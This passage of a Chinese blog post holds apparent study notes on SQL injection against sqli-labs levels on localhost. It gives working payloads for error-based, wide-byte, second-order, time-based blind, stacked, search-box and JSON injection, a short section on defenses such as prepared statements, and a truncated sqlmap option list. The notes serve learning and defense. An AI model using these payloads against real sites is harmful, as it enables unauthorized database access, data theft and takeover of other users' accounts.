updatesml(xml标记位置，Xpath路径，需要修改的内容)</li><li>备注：如果select version(）两端不加括号的话，就会与concat()中前一个占位符和后一个占位符进行一个字符串拼接。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-string">&#x27; and/or updatexml(1, concat(&#x27;</span>[<span class="hljs-string">&#x27;, (select version()), &#x27;</span>]<span class="hljs-string">&#x27;), 3) --+ # XPATH syntax error: &#x27;</span>[<span class="hljs-number">5.7</span><span class="hljs-number">.26</span><span class="hljs-operator">-</span>log]<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281359422.png" alt="image.png"></li></ul><h4 id="floor-报错函数"><a href="#floor-报错函数" class="headerlink" title="floor()报错函数"></a>floor()报错函数</h4><ul><li>floor()函数作用：是不管四舍五入都进行向下取整</li></ul><h5 id="总结-有几个参数每个参数代表什么，为什么能发生报错注入漏洞，为什么要在concat前面要拼接字符，不拼接会发生什么，能拼接以哪种形式可以拼接那种不能拼接-："><a href="#总结-有几个参数每个参数代表什么，为什么能发生报错注入漏洞，为什么要在concat前面要拼接字符，不拼接会发生什么，能拼接以哪种形式可以拼接那种不能拼接-：" class="headerlink" title="总结(有几个参数每个参数代表什么，为什么能发生报错注入漏洞，为什么要在concat前面要拼接字符，不拼接会发生什么，能拼接以哪种形式可以拼接那种不能拼接)："></a>总结(有几个参数每个参数代表什么，为什么能发生报错注入漏洞，为什么要在concat前面要拼接字符，不拼接会发生什么，能拼接以哪种形式可以拼接那种不能拼接)：</h5><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281438034.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-string">&#x27;a&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.`TABLES` <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> SCHEMA())), <span class="hljs-string">&#x27;~&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281359422.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.`TABLES` <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> SCHEMA())), <span class="hljs-string">&#x27;~&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281401742.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.`TABLES` <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> SCHEMA())), <span class="hljs-string">&#x27;~&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281402662.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-string">&#x27;/&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.`TABLES` <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> SCHEMA())), <span class="hljs-string">&#x27;~&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281402258.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-string">&#x27;\\&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.`TABLES` <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> SCHEMA())), <span class="hljs-string">&#x27;~&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="宽字节注入-冷门注入方式-（32）"><a href="#宽字节注入-冷门注入方式-（32）" class="headerlink" title="宽字节注入(冷门注入方式)（32）"></a>宽字节注入(冷门注入方式)（32）</h4><ul><li>WAF为web应用防火墙，WAF当中存放着各种各样的正则表达式</li><li>%27：为单引号</li><li>‘&#39;：%5c</li><li>%df%5C：運</li><li>目前SQL中存在逻辑漏洞</li><li>宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节</li><li>GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节</li><li>转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种是配置magic_quote_gpc，不过PHP高版本已经移除此功能</li><li>总结：<ul><li>宽字符注入是一种编码转换上存在的漏洞，一般SQL在设置编码是会开启过滤特殊字符，比如 ‘  ‘)   ‘’)，一般这种漏洞存在于php前端页面编码与数据库编码不一致所导致。 要有宽字节注入漏洞，首先要满足数据库后端使用双&#x2F;多字节解析SQL语句，其次还要保证在该种字符集范围中包含低字节位是0x5C(01011100) 的字符，初步的测试结果 Big5 和 GBK 字符集都是有的，UTF-8 和GB2312没有这种字符（也就不存在宽字节注入）。  换句话说假如php前端页面数据和后端SQL编码都采用UTF-8 或者GB2312编码就不存在宽字节注入</li><li>在宽字节注入时，注入逻辑和联合注入逻辑相似，只是在宽字节注入时需要对单独的引号做%df%5C%27用来逃避SQL设置的过滤特殊字符设置 如：<code>id=-1%df%5C%27 or 1 = 1</code>。SQL中常见的转义设置与配置addslashes、mysql_real_escape_string、mysql_escape_string、php.ini中magic_quote_gpc的配置</li><li>在联合查询中，需要将联合查询语句当中引号当中的内容转为16进制</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">5</span>C<span class="hljs-operator">%</span><span class="hljs-number">27</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,  (<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name <span class="hljs-operator">=</span> <span class="hljs-number">0x7573657273</span> <span class="hljs-keyword">and</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-number">0x7365637572697479</span>) ,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281402665.png" alt="image.png"></li></ul><h4 id="二次注入（24）"><a href="#二次注入（24）" class="headerlink" title="二次注入（24）"></a>二次注入（24）</h4><ul><li>使用正常功能插入数据</li><li><code>echo &#39;\&#39;&#39; ----&gt;&#39;</code></li><li>原理：在一次注入是数据中存在非法字符，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</li><li>例如：在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</li><li>二次注入的目的<ul><li>为了获取数据库中的信息，伪造身份</li></ul></li><li>二次注入为什么会生效：<ul><li>用户从前端输入数据库中的一个用户名(用户名必须是数据库当中的)并且在用户名后面跟上转义字符，比如数据库中的用户名Tom  在新的注册页面上输入<code>Tom&#39;#</code> &#x2F; <code>Tom&#39;--空格</code>  然后在修改密码，如果修改密码成功页面成功，就说明<code>Tom&#39;#</code>修改的密码是数据库中原有Tom的密码，不是Tom’#的密码，之所以会出现这种情况是因为注入点发生在Tom和<code>#</code>&#x2F;<code>--空格</code>之间的<code>&#39;</code>，因为 <code>&#39;\&#39;&#39;</code>转义后输出为<code>&#39;</code>，</li></ul></li></ul><p><code>#</code>&#x2F;<code>--空格</code>会把后面内容注释，<code>&#39;</code>会和<code>&#39;Tom</code>组成数据库中原有的Tom并且第二次注册的<code>Tom&#39;#</code>依然可以登录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> username  <span class="hljs-keyword">FROM</span> `users` <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">and</span> curr_password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$curr_password&#x27;</span> # 原有<span class="hljs-keyword">SQL</span><br><span class="hljs-keyword">SELECT</span> username  <span class="hljs-keyword">FROM</span> `users` <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Tom&#x27;</span> #<span class="hljs-string">&#x27; and curr_password =&#x27;</span>$curr_password<span class="hljs-string">&#x27; # 修改</span><br><span class="hljs-string">SELECT username  FROM `users` WHERE username = &#x27;</span>Tom<span class="hljs-string">&#x27; -- &#x27;</span> <span class="hljs-keyword">and</span> curr_password <span class="hljs-operator">=</span><span class="hljs-string">&#x27;$curr_password&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403148.png" alt="image.png"><br>过程：</p><ol><li>账户原有用户</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403170.png" alt="image.png"></p><ol start="2"><li>添加新用户：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403666.png" alt="image.png"></p><ol start="3"><li>以新用户登录</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403128.png" alt="image.png"></p><ol start="4"><li>修改密码</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281404676.png" alt="image.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403502.png" alt="image.png"></p><ol start="5"><li>查看数据库，实际修改的密码为数据库中原有Tom的密码</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403182.png" alt="image.png"></p><h4 id="延迟注入（9，10）"><a href="#延迟注入（9，10）" class="headerlink" title="延迟注入（9，10）"></a>延迟注入（9，10）</h4><p>有单引号闭合叫：字符型闭合<br>没有单引号和括号叫数字型注入</p><ul><li>id &#x3D; -1’ and if((substr(schema()) ,1,1)  &#x3D; ‘a’,条件为真，条件为假 )</li><li>先猜长度再猜值</li><li>length对字符串的标点也要进行统计</li><li>在写脚本时为什么先获取长度？<ul><li>因为，在黑盒测试下，攻击者不清楚数库中的信息，所以需要对数据库名称进行一个个探测，写脚本是用循环不清楚要循环多少次才能测试出整个数据库名称，假如先获取当前数据库名车长度然后根据长度在做循环，就可以简化脚本运行时间提高效率。简而言之获取长度是为了知道脚本再什么时候停止运行。</li></ul></li><li>再获取表中字段时，为什么tmp &#x3D; ‘’要放在for循环外面<ul><li>因为如果放在for循环里面，tmp &#x3D; ‘’都要初始化，每循环一次，就初始化一次，导致循环结果放不到tmp当中</li></ul></li><li>延迟注入<ul><li>在测试过程中，攻击方对目标目标数据库任何信息不知道的情况，在搜索框或者抓包之后看不到SQL语句的执行状态，只能从网页页面上的变化来推断出插入的SQL注入是否生效。在这种情况下可以使用盲注的方法进行对目标探测。延迟注入也是盲注的一种。</li><li>先用正常参数进行探测，发现返回You are in…………..</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281404343.png" alt="image.png"></li><li>在使用闭合方式+order by 进一步探测是否可以使用延迟注入，发现使用闭合方式+order by于正常输入参数返回结果一致，此时可以判断这里存在延迟注入</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281404784.png" alt="image.png"></li><li>使用 <code>if()</code>,<code>length()</code>,<code>substr()</code>这三个依次对表的长度-&gt;表名，表中列的长度，表中内容表中列的字段，输入列名后列中所有内容长度，最后查询表中信息</li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>Less<span class="hljs-number">-9</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if( substr(schema() , 1 , 1)=&#x27;</span>s<span class="hljs-string">&#x27;  , sleep(10) , sleep(0)) --+</span><br></code></pre></td></tr></table></figure><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281437674.png" alt="image.png"></li></ul><h4 id="堆叠注入（38）"><a href="#堆叠注入（38）" class="headerlink" title="堆叠注入（38）"></a>堆叠注入（38）</h4><ul><li>为什么前面关卡不能用堆叠？<ul><li>这是源代码层面的问题，堆叠注入时源代码使用mysqli_multi_query()函数，这个函数可以执行多个查询，而之前用到是 mysql_qurery()只能执行一条查询语句</li><li>在堆叠注入时，我们可以在前后闭合的情况下，在每个查询语句后面加分号在加上一条查询语句。</li></ul></li></ul><h4 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h4><ul><li>前提：MySQL所在主机可以出网，mySQL打开了相关权限</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281407293.jpg"></p><h4 id="防范SQL注入"><a href="#防范SQL注入" class="headerlink" title="防范SQL注入"></a>防范SQL注入</h4><h4 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h4><ul><li>对前端输入进来的SQL语句进行转义</li><li>PHP中使用PDO进行预编译，PDO是PHP中的一个类</li><li>java中预编译类：创建preparedStatement对象，SQL语句中在需要数据的地方用”?”占位，然后使用set()方法对占位进行填充，最后用executeUpdate()进行执行</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281405819.png" alt="image.png"></li><li>预编译技术不能百分百防御SQL注入</li></ul><h4 id="转码-转义"><a href="#转码-转义" class="headerlink" title="转码(转义)"></a>转码(转义)</h4><ul><li>mysql_real_escape_string()——这个方法在PHP中已经过时，这个方法只在UTF-8的编码下生效</li></ul><h4 id="正则表达式-简单粗暴，但是效果得看具体情况"><a href="#正则表达式-简单粗暴，但是效果得看具体情况" class="headerlink" title="正则表达式(简单粗暴，但是效果得看具体情况)"></a>正则表达式(简单粗暴，但是效果得看具体情况)</h4><ul><li>正则表达式匹配特殊字符，匹配到特殊字符后将其替换位空，或者拒绝执行SQL语句<ul><li>PHP-<strong>preg_replace方法</strong></li><li>java-<strong>Pattern类</strong></li><li>Go-<strong>Regexp类</strong></li><li>Python-<strong>re包</strong></li></ul></li></ul><h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><h5 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h5><ul><li><pre><code class="hljs">http://localhost:8080/blog/new.php?search=百度%&#39;union+all+select+1,database(),2,3 and &#39;%&#39;=&#39;<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>##### Json格式注入<br><br>-   ```<br>    http:<span class="hljs-comment">//localhost:8080/json.php</span><br>    使用Post提交，data数据如下：<br>    json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&#x27;and 1=2 union select 1,2,3#&quot;</span>&#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul><h5 id="其他注入方式"><a href="#其他注入方式" class="headerlink" title="其他注入方式"></a>其他注入方式</h5><ul><li>后台要记录操作访问IP<ul><li>IP要进行代码获取，获取到之后，IP有一定概率会记录到数据库当中，如果IP能自定义数据，就可以尝试注入</li></ul></li><li>网站要根据用户的访问设备给予显示页面<ul><li>接受访问的UA信息，将各种UA信息进行数据整理，用户访问后对比数据库中UA值来进行判断</li></ul></li><li>网站要进行文件上传或者用户登录<ul><li>由于文件上传可大可小，如果采用GET则无法满足传输条件，URl长度限制会触发，所以一般会采用POST</li><li>用户登录，接收到账号和密码后会带入后端数据库当中进行对比。可以尝试注入</li></ul></li><li>在数据包中添加<code>X-Forwarded-For: 伪造的IP地址</code>如果页面</li></ul><h4 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><code class="hljs sql">用法：python sqlmap.py [选项]<br><br>选项：<br>  <span class="hljs-operator">-</span>h, <span class="hljs-comment">--help            显示基本帮助信息并退出</span><br>  <span class="hljs-operator">-</span>hh                   显示高级帮助信息并退出<br>  <span class="hljs-comment">--version             显示程序版本信息并退出</span><br>  <span class="hljs-operator">-</span>v VERBOSE            输出信息详细程度级别：<span class="hljs-number">0</span><span class="hljs-number">-6</span>（默认为 <span class="hljs-number">1</span>）<br><br>  目标：<br>    至少提供一个以下选项以指定目标<br><br>    <span class="hljs-operator">-</span>u URL, <span class="hljs-comment">--url=URL   目标 URL（例如：&quot;http://www.site.com/vuln.php?id=1&quot;）</span><br>    <span class="hljs-operator">-</span>d DIRECT           可直接连接数据库的地址字符串<br>    <span class="hljs-operator">-</span>l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址<br>    <span class="hljs-operator">-</span>m BULKFILE         从文本文件中获取批量目标<br>    <span class="hljs-operator">-</span>r REQUESTFILE      从文件中读取 HTTP 请求<br>    <span class="hljs-operator">-</span>g GOOGLEDORK       使用 Google dork 结果作为目标<br>    <span class="hljs-operator">-</span>c CONFIGFILE       从 INI 配置文件中加载选项<br><br>  请求：<br>    以下选项可以指定连接目标地址的方式<br><br>    <span class="hljs-operator">-</span>A AGENT, <span class="hljs-comment">--user..  设置 HTTP User-Agent 头部值</span><br>    <span class="hljs-operator">-</span>H HEADER, <span class="hljs-comment">--hea..  设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）</span><br>    <span class="hljs-comment">--method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）</span><br>    <span class="hljs-comment">--data=DATA         使用 POST 发送数据串（例如：&quot;id=1&quot;）</span><br>    <span class="hljs-comment">--param-del=PARA..  设置参数值分隔符（例如：&amp;）</span><br>    <span class="hljs-comment">--cookie=COOKIE     指定 HTTP Cookie（例如：&quot;PHPSESSID=a8d127e..&quot;）</span><br>    <span class="hljs-comment">--cookie-del=COO..  设置 cookie 分隔符（例如：;）</span><br>    <span class="hljs-comment">--live-cookies=L..  指定 Live cookies 文件以便加载最新的 Cookies 值</span><br>    <span class="hljs-comment">--load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件</span><br>    <span class="hljs-comment">--drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数</span><br>    <span class="hljs-comment">--mobile            使用 HTTP User-Agent 模仿智能手机</span><br>    <span class="hljs-comment">--random-agent      使用随机的 HTTP User-Agent</span><br>    <span class="hljs-comment">--host=HOST         指定 HTTP Host</span><br>    <span class="hljs-comment">--referer=REFERER   指定 HTTP Referer</span><br>    <span class="hljs-comment">--headers=HEADERS   设置额外的 HTTP 头参数（例如：&quot;Accept-Language: fr\nETag: 123&quot;）</span><br>    <span class="hljs-comment">--auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）</span><br>    <span class="hljs-comment">--auth-cred=AUTH..  HTTP 认证凭证（username:password）</span><br>    <span class="hljs-comment">--auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件</span><br>    <span class="hljs-comment">--ignore-code=IG..  忽略（有问题的）HTTP 错误码（例如：401）</span><br>    <span class="hljs-comment">--ignore-proxy      忽略系统默认代理设置</span><br>    <span class="hljs-comment">--ignore-redirects  忽略重定向尝试</span><br>    <span class="hljs-comment">--ignore-timeouts   忽略连接超时</span><br>    <span class="hljs-comment">--proxy=PROXY       使用代理连接目标 URL</span><br>    <span class="hljs-comment">--proxy-cred=PRO..  使用代理进行认证（username:password）</span><br>    <span class="hljs-comment">--proxy-file=PRO..  从文件中加载代理列表</span><br>    <span class="hljs-comment">--proxy-freq=PRO..  通过给定列表中的不同代理依次发出请求</span><br>    <span class="hljs-comment">--tor               使用 Tor 匿名网络</span><br>    <span class="hljs-comment">--tor-port=TORPORT  设置 Tor 代理端口代替默认端口</span><br>    <span class="hljs-comment">--tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））</span><br>    <span class="hljs-comment">--check-tor         检查是否正确使用了 Tor</span><br>    <span class="hljs-comment">--delay=DELAY       设置每个 HTTP 请求的延迟秒数</span><br>    <span class="hljs-comment">--timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）</span><br>    <span class="hljs-comment">--retries=RETRIES   连接超时时重试次数（默认为 3）</span><br>    <span class="hljs-comment">--randomize=RPARAM  随机更改给定的参数值</span><br>    <span class="hljs-comment">--safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：</span><br>                        有些网站在你连续多次访问错误地址时会关闭会话连接，<br>                        后面的“请求”小节有详细说明）<br>    <span class="hljs-comment">--safe-post=SAFE..  使用 POST 方法发送合法的数据</span><br>    <span class="hljs-comment">--safe-req=SAFER..  从文件中加载合法的 HTTP 请求</span><br>    <span class="hljs-comment">--safe-freq=SAFE..  在访问给定的合法 URL 之间穿插发送测试请求</span><br>    <span class="hljs-comment">--skip-urlencode    不对 payload 数据进行 URL 编码</span><br>    <span class="hljs-comment">--csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token</span><br>    <span class="hljs-comment">--csrf-url=CSRFURL  指定可提取防 CSRF 攻击 token 的 URL</span><br>    <span class="hljs-comment">--csrf-method=CS..  指定访问防 CSRF token 页面时使用的 HTTP 方法</span><br>    <span class="hljs-comment">--csrf-retries=C..  指定获取防 CSRF token 的重试次数 （默认为 0）</span><br>    <span class="hljs-comment">--force-ssl         强制使用 SSL/HTTPS</span><br>    <span class="hljs-comment">--chunked           使用 HTTP 分块传输编码（POST）请求</span><br>    <span class="hljs-comment">--hpp               使用 HTTP 参数污染攻击</span><br>    <span class="hljs-comment">--eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：</span><br>                        &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）<br><br>  优化：<br>    以下选项用于优化 sqlmap 性能<br><br>    <span class="hljs-operator">-</span>o                  开启所有优化开关<br>    <span class="hljs-comment">--predict-output    